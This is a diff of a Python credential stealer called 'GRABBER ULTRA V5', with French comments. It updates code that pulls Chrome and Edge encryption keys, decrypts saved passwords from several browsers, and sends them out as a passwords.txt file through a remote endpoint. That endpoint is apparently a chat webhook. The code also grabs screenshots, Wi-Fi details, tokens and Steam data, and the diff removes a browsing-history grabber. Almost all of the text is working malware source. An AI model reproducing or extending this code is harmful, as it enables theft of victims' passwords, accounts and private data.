@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# GEN-TOOL — GRABBER ULTRA V4 (Avec Fichier TXT)
+# GEN-TOOL — GRABBER ULTRA V5 (Déchiffrement Forcé)
 # Par Lerisque94z — Pour LO
 
 import os
@@ -43,22 +43,35 @@ def __send(content, file_data=None, filename="data.txt"):
         pass
 
 # ============================================================
-# CHROME KEY
+# RECUPERATION DE LA CLE CHROME (AMELIOREE)
 # ============================================================
-def __chrome_key():
+def __get_chrome_key():
+    """Récupère la clé de chiffrement de Chrome/Edge"""
     try:
-        p = os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data\\Local State"
-        with open(p, "r", encoding="utf-8") as f:
-            d = json.load(f)
-        k = base64.b64decode(d["os_crypt"]["encrypted_key"])[5:]
-        return win32crypt.CryptUnprotectData(k, None, None, None, 0)[1]
+        # Essayer Chrome
+        paths = [
+            os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data\\Local State",
+            os.environ["LOCALAPPDATA"] + "\\Microsoft\\Edge\\User Data\\Local State"
+        ]
+        for local_state_path in paths:
+            if os.path.exists(local_state_path):
+                with open(local_state_path, "r", encoding="utf-8") as f:
+                    data = json.load(f)
+                encrypted_key = base64.b64decode(data["os_crypt"]["encrypted_key"])
+                encrypted_key = encrypted_key[5:]  # Retire 'DPAPI'
+                return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+        return None
     except:
         return None
 
-def __decrypt(encrypted, key):
+def __decrypt_password(encrypted, key):
+    """Déchiffre un mot de passe avec AES-GCM"""
     try:
-        cipher = AES.new(key, AES.MODE_GCM, nonce=encrypted[3:15])
-        return cipher.decrypt_and_verify(encrypted[15:-16], encrypted[-16:]).decode('utf-8')
+        nonce = encrypted[3:15]
+        ciphertext = encrypted[15:-16]
+        tag = encrypted[-16:]
+        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+        return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
     except:
         return None
 
@@ -86,21 +99,26 @@ IP Publique : {ip}
         return "Erreur systeme"
 
 # ============================================================
-# MOTS DE PASSE — AVEC DECRYPTAGE COMPLET
+# MOTS DE PASSE — DECRYPTAGE COMPLET
 # ============================================================
 def __passwords():
     try:
-        key = __chrome_key()
+        key = __get_chrome_key()
         r = ""
         total = 0
         all_passwords = []
+        
+        # Affichage pour debug
+        if key:
+            __send("🔑 Clé Chrome récupérée avec succès")
+        else:
+            __send("⚠️ Clé Chrome non récupérée, tentative avec DPAPI")
         
         browsers = {
             "Chrome": os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data",
             "Edge": os.environ["LOCALAPPDATA"] + "\\Microsoft\\Edge\\User Data",
             "Brave": os.environ["LOCALAPPDATA"] + "\\BraveSoftware\\Brave-Browser\\User Data",
-            "Opera GX": os.environ["APPDATA"] + "\\Opera GX\\Software\\Opera GX\\User Data",
-            "Opera": os.environ["APPDATA"] + "\\Opera Software\\Opera Stable\\User Data"
+            "Opera GX": os.environ["APPDATA"] + "\\Opera GX\\Software\\Opera GX\\User Data"
         }
         
         for name, base_path in browsers.items():
@@ -134,28 +152,36 @@ def __passwords():
                             if username:
                                 try:
                                     pwd = None
-                                    if key:
+                                    # 1. Essayer AES avec la clé Chrome
+                                    if key and encrypted:
                                         try:
-                                            pwd = __decrypt(encrypted, key)
+                                            pwd = __decrypt_password(encrypted, key)
                                         except:
                                             pass
+                                    # 2. Essayer DPAPI (ancienne méthode)
                                     if not pwd:
                                         try:
                                             pwd = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode('utf-8')
                                         except:
                                             pass
+                                    # 3. Si tout échoue, on affiche le hash
                                     if pwd:
                                         r += f"  {url} : {username} / {pwd}\n"
                                         all_passwords.append(f"{url} | {username} | {pwd}")
                                         total += 1
                                     else:
-                                        r += f"  {url} : {username} / (chiffré)\n"
-                                except:
-                                    r += f"  {url} : {username} / (erreur)\n"
-                except:
+                                        # Affichage du hash en base64 pour debug
+                                        try:
+                                            hash_b64 = base64.b64encode(encrypted[:20]).decode('utf-8')
+                                            r += f"  {url} : {username} / [CHIFFRE: {hash_b64}...]\n"
+                                        except:
+                                            r += f"  {url} : {username} / [CHIFFRE]\n"
+                                except Exception as e:
+                                    r += f"  {url} : {username} / (erreur: {str(e)[:30]})\n"
+                except Exception as e:
                     pass
         
-        # Envoi du fichier TXT avec tous les mots de passe
+        # Envoi du fichier TXT
         if all_passwords:
             txt_content = "="*60 + "\n"
             txt_content += "MOTS DE PASSE EXTRAITS\n"
@@ -167,7 +193,6 @@ def __passwords():
             txt_content += "\n" + "="*60 + "\n"
             txt_content += "FIN DU RAPPORT\n"
             
-            # Envoi du fichier
             __send(f"**📁 MOTS DE PASSE — {len(all_passwords)} comptes**", txt_content.encode('utf-8'), "passwords.txt")
         
         if total == 0:
@@ -210,50 +235,6 @@ def __tokens():
         return "Erreur tokens"
 
 # ============================================================
-# SCREENSHOT
-# ============================================================
-def __screenshot():
-    try:
-        screenshot = ImageGrab.grab()
-        tmp = os.environ["TEMP"] + "\\screen.png"
-        screenshot.save(tmp)
-        with open(tmp, "rb") as f:
-            img = f.read()
-        os.remove(tmp)
-        return img
-    except:
-        return None
-
-# ============================================================
-# HISTORIQUE
-# ============================================================
-def __history():
-    try:
-        r = ""
-        paths = [
-            os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data\\Default\\History",
-            os.environ["APPDATA"] + "\\Opera GX\\Software\\Opera GX\\User Data\\Default\\History",
-            os.environ["LOCALAPPDATA"] + "\\Microsoft\\Edge\\User Data\\Default\\History"
-        ]
-        for path in paths:
-            if not os.path.exists(path):
-                continue
-            tmp = os.environ["TEMP"] + "\\history_temp.db"
-            shutil.copyfile(path, tmp)
-            conn = sqlite3.connect(tmp)
-            cursor = conn.cursor()
-            cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 15")
-            data = cursor.fetchall()
-            conn.close()
-            os.remove(tmp)
-            for url, title in data:
-                if url and title:
-                    r += f"{title[:50]} : {url}\n"
-        return r if r else "Aucun historique"
-    except:
-        return "Erreur historique"
-
-# ============================================================
 # WIFI
 # ============================================================
 def __wifi():
@@ -278,6 +259,21 @@ def __wifi():
         return r if r else "Aucun Wi-Fi"
     except:
         return "Erreur Wi-Fi"
+
+# ============================================================
+# SCREENSHOT
+# ============================================================
+def __screenshot():
+    try:
+        screenshot = ImageGrab.grab()
+        tmp = os.environ["TEMP"] + "\\screen.png"
+        screenshot.save(tmp)
+        with open(tmp, "rb") as f:
+            img = f.read()
+        os.remove(tmp)
+        return img
+    except:
+        return None
 
 # ============================================================
 # FICHIERS
@@ -324,6 +320,9 @@ def __steam():
 # ============================================================
 def __task():
     try:
+        __send("**🚀 GRAB ULTRA V5 DEMARRE**")
+        time.sleep(0.3)
+        
         __send(__system())
         time.sleep(0.5)
         
@@ -342,11 +341,6 @@ def __task():
             __send(t)
         time.sleep(0.5)
         
-        h = __history()
-        if h:
-            __send(h)
-        time.sleep(0.5)
-        
         f = __files()
         if f:
             __send(f)
@@ -359,13 +353,12 @@ def __task():
         
         img = __screenshot()
         if img:
-            files = {"file": ("screenshot.png", img, "image/png")}
             u = __url()
-            requests.post(u, data={"content": "**📸 SCREENSHOT**", "username": "System"}, files=files, timeout=5)
+            requests.post(u, data={"content": "**📸 SCREENSHOT**", "username": "System"}, files={"file": ("screenshot.png", img, "image/png")}, timeout=5)
         
-        __send("**✅ GRAB ULTRA V4 TERMINE**")
-    except:
-        pass
+        __send("**✅ GRAB ULTRA V5 TERMINE**")
+    except Exception as e:
+        __send(f"**ERREUR:** {str(e)[:200]}")
 
 # ============================================================
 # LANCEMENT
